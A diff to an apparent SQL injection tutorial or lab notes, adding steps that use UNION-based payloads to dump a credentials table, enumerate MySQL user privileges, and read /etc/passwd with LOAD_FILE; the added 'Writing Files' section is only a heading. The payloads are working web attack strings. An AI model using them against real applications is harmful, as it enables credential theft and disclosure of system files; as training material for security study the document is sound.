@@ -21,6 +21,8 @@ This document summarizes core techniques for discovery and exploitation of **SQL
         - [Fingerprinting](#fingerprinting)
         - [Database Enumeration](#database-enumeration)
         - [Crafting a Payload](#crafting-a-payload)
+    - [Reading Files](#reading-files)
+    - [Writing Files](#writing-files)
 
 ---
 
@@ -860,12 +862,96 @@ cn' UNION SELECT 1, COLUMN_NAME, TABLE_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEM
 
 ### Crafting a Payload
 
-The groundwork has been laid and it is now time to exploit the target. Based on the previous steps, the attacker has decided to target the `dev` database. The goal is to dump all data from the `username` and `password` columns in the `credentials` table. 
+With the groundwork complete, the attacker is now ready to exploit the target. Based on the previous steps, the attacker has decided to target the `dev` database. The goal is to retrieve all records from the `username` and `password` columns in the `credentials` table. 
 
-The following payload should do the trick:
+This payload places the extracted data into columns that were previously identified as visible in the application’s response:
 
 ```sql
 cn' UNION SELECT 1, username, password, 4 FROM dev.credentials--  
 ```
 
 ![Filtered output](images/payload.png)
+
+As a result, the attacker is able to extract sensitive credential data directly from the database.
+
+---
+
+## Reading Files
+
+In MySQL, users require the `FILE` privilege to read files from the underlying filesystem. Files are read using the `LOAD_FILE()` function, which loads the contents of a file into the result set of a query.
+
+**Step 1: Fingerprint the User** 
+To fingerprint the user, any of the following payloads can be utilized:
+
+```sql
+-- Queries
+SELECT USER();
+SELECT CURRENT_USER();
+SELECT user FROM mysql.user;
+```
+
+The `USER()` function returns the authenticated MySQL user, while `CURRENT_USER()` returns the account used by the server for privilege checks.
+
+```sql
+-- Payloads
+cn' UNION SELECT 1, USER(), 3, 4-- 
+cn' UNION SELECT 1, CURRENT_USER(), 3, 4-- 
+cn' UNION SELECT 1, user, 3, 4 FROM mysql.user-- 
+```
+
+![Filtered output](images/user.png)
+
+The current user is `root`. This is usually a good sign.
+
+**Step 2: Enumerate Privileges**
+
+When the user is known, the next step is to enumerate the privileges assigned to that user. 
+
+Any of the following payloads can be utilized to check for `administrative` privileges:
+
+```sql
+-- Query
+SELECT super_priv FROM mysql.user;
+```
+
+```sql
+-- Payloads
+ cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
+ cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- 
+```
+
+![Filtered output](images/super-admin.png)
+
+The query returns `Y`, indicating that the user has `administrative` privileges.
+
+A similar payload can be utilized to enumerate **all** privileges assigned to the user:
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee=" 'root'@'localhost "--  
+```
+
+![Filtered output](images/file-privileges.png)
+
+The result from the query confirms that the `root` user does indeed have `FILE` privileges. 
+
+**Step 3: Read Files**
+
+The `LOAD_FILE` function is used to load a file into a table. 
+
+The following payload can be utilized to load and read a file:
+
+```sql
+-- Query
+SELECT LOAD_FILE('/etc/passwd');
+```
+
+```sql
+-- Payload
+cn' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4--  
+```
+
+![Filtered output](images/file-read.png)
+
+---
+
+## Writing Files
